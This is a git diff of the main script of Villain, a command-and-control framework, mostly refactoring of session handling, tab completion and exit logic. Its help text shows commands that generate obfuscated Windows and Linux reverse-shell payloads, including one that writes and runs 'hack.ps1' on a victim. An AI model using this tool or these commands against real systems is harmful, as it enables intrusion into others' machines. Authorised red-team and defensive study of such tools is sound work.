@@ -6,11 +6,8 @@
 # https://github.com/t3l3machus/Villain
 
 
-import os, sys, argparse, re
-from threading import Thread
+import argparse
 from subprocess import check_output
-from pyperclip import copy as copy2cb
-from time import sleep, time
 from Core.common import *
 from Core.settings import Hoaxshell_settings, Core_server_settings
 from string import ascii_uppercase, ascii_lowercase, digits
@@ -58,8 +55,7 @@ def print_banner():
 
 	banner = [V,I,L,L2,A,I,N]
 	final = []	
-	init_color = 97 #89 #97
-	# ~ init_color = 3
+	init_color = 97 #357 #95 #89 #97
 	txt_color = init_color
 	cl = 0
 		
@@ -75,7 +71,6 @@ def print_banner():
 			cl = 0
 
 			txt_color = init_color
-		# ~ init_color += 30
 		init_color += 1
 
 		if charset < 2: final.append('\n   ')
@@ -107,10 +102,10 @@ class PrompHelp:
 			\r  will be adjusted accordingly. 
 				
 			\r  {BOLD}For Windows{END}:
-			\r  {ORANGE}generate os=windows lhost=<IP or IFACE> [ exec_outfile=<REMOTE PATH> domain=<DOMAIN>] [ obfuscate encode constraint_mode ]{END}
+			\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> [ exec_outfile=<REMOTE PATH> domain=<DOMAIN>] [ obfuscate encode constraint_mode ]{END}
 
 			\r  Use exec_outfile to write & execute commands from a specified file on the victim (instead of using IEX):
-			\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> exec_outfile="C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1{END}"
+			\r  {ORANGE}generate os=windows lhost=<IP or INTERFACE> exec_outfile="C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1"{END}
 
 			\r  {BOLD}For Linux{END}:
 			\r  {ORANGE}generate os=linux lhost=<IP or INTERFACE> [ domain=<DOMAIN> ]{END}
@@ -299,6 +294,23 @@ def alias_sanitizer(word, _min = 2, _max = 26):
 	else:
 		return ['Alias length must be between 2 to 26 characters.']
 		
+
+
+# ~ def restore_prompt():
+
+	# ~ Threading_params.thread_limiter.acquire()
+	
+	# ~ timeout_start = time()
+
+	# ~ while time() < timeout_start + 15:	
+	
+		# ~ sleep(5)
+		
+	# ~ else:
+		# ~ Main_prompt.set_main_prompt_ready()
+		# ~ Threading_params.thread_limiter.release()
+		# ~ return
+
 	
 	
 # Tab auto-completer          
@@ -309,7 +321,7 @@ class Completer(object):
 		self.tab_counter = 0		
 		self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
 		self.generate_arguments = ['os', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
-		'trusted_domain', 'exec_outfile', 'execpoutsa']
+		'trusted_domain', 'exec_outfile']
 	
 	
 	
@@ -379,14 +391,14 @@ class Completer(object):
 
 
 	def update_prompt(self, typed, new_content, lower = False):
-		readline.insert_text(new_content[typed:])			
+		global_readline.insert_text(new_content[typed:])			
 	
 	
 	
 	def complete(self, text, state):
 		
 		self.tab_counter += 1
-		line_buffer_val = readline.get_line_buffer().strip()
+		line_buffer_val = global_readline.get_line_buffer().strip()
 		lb_list = re.sub(' +', ' ', line_buffer_val).split(' ')
 		lb_list_len = len(lb_list) if lb_list != [''] else 0
 		
@@ -457,7 +469,7 @@ class Completer(object):
 			# Appending match substring 
 			if len(match) == 1:
 				typed = len(search_term)
-				readline.insert_text(match[0][typed:])
+				global_readline.insert_text(match[0][typed:])
 				self.tab_counter = 0
 				
 			# Print all matches
@@ -467,7 +479,7 @@ class Completer(object):
 				Main_prompt.rst_prompt()
 						
 		# Reset tab counter after 0.5s of inactivity
-		threading.Thread(name="reset_counter", target=self.reset_counter).start()
+		Thread(name="reset_counter", target=self.reset_counter).start()
 		return
 		
 
@@ -534,9 +546,9 @@ def main():
 		
 	''' Start tab autoComplete '''
 	comp = Completer()
-	readline.set_completer_delims(' \t\n;')
-	readline.parse_and_bind("tab: complete")
-	readline.set_completer(comp.complete)			
+	global_readline.set_completer_delims(' \t\n;')
+	global_readline.parse_and_bind("tab: complete")
+	global_readline.set_completer(comp.complete)			
 		
 	
 	''' +---------[ Command prompt ]---------+'''
@@ -609,8 +621,14 @@ def main():
 								
 
 
-				elif cmd == 'kill':					
-					sessions_manager.kill_session(cmd_list[1])
+				elif cmd == 'kill':
+					session_id = sessions_manager.alias_to_session_id(cmd_list[1])
+					
+					if not session_id:
+						print('Failed to interpret session_id.')
+						continue	
+														
+					sessions_manager.kill_session(session_id)
 
 						
 
@@ -645,6 +663,11 @@ def main():
 							
 							# Check if session id has alias
 							session_id = sessions_manager.alias_to_session_id(session_id)
+							
+							if not session_id:
+								print('Failed to interpret session_id.')
+								Main_prompt.main_prompt_ready = True
+								continue								
 
 							# Check who is the owner of the shell session
 							session_owner_id = sessions_manager.return_session_owner_id(session_id)
@@ -669,8 +692,14 @@ def main():
 						
 					if Sessions_manager.active_sessions.keys():
 						
-						Main_prompt.main_prompt_ready = False							
+						Main_prompt.main_prompt_ready = False	
 						session_id = Sessions_manager.alias_to_session_id(cmd_list[1])
+						
+						if not session_id:
+							print('Failed to interpret session_id.')
+							Main_prompt.main_prompt_ready = True
+							continue
+																		
 						os_type = sessions_manager.active_sessions[session_id]['OS Type']
 						Hoaxshell.activate_shell_session(session_id, os_type)
 						
@@ -725,7 +754,7 @@ def main():
 							print('Invalid session ID.')
 
 					else:
-						print(f'\r[{INFO}] No active session.')		
+						print(f'\rNo active sessions.')		
 
 
 
@@ -777,18 +806,15 @@ def main():
 		
 		except KeyboardInterrupt:
 			
+			verified = True
+			
 			if Sessions_manager.active_sessions.keys() or core.sibling_servers.keys():
 				choice = input('\nAre you sure you wish to exit? All of your sessions/connections with siblings will be lost [yes/no]: ').lower()
 				verified = True if choice in ['yes', 'y'] else False
-				
-			else:
-				verified = True
-				
-			
-			if verified:
-				
+										
+			if verified:				
 				print('\r')
-				Core_server.announce_server_shutdown()					
+				Core_server.announce_server_shutdown()			
 				Hoaxshell.terminate()
 				core.stop_listener()
 				sys.exit(0)
